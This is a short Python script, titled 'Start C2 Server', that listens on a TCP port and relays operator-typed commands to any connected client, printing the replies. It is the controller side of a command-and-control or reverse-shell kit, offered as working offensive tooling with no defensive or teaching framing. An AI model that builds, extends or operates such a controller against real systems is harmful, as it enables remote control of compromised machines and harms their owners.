import socket
import argparse

def start_server(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"Server listening on {host}:{port}")

    while True:
        conn, addr = server.accept()
        print(f"Connection established from {addr}")

        while True:
            command = input("Enter command: ")
            conn.send(command.encode())
            if command.lower() == 'exit':
                break

            data = conn.recv(1024).decode()
            print(f"Received: {data}")

        conn.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start C2 Server')
    parser.add_argument('--host', default='127.0.0.1', help='Server host (default: 127.0.0.1)')
    parser.add_argument('--port', type=int, default=12345, help='Server port number (default: 12345)')
    args = parser.parse_args()

    start_server(args.host, args.port)
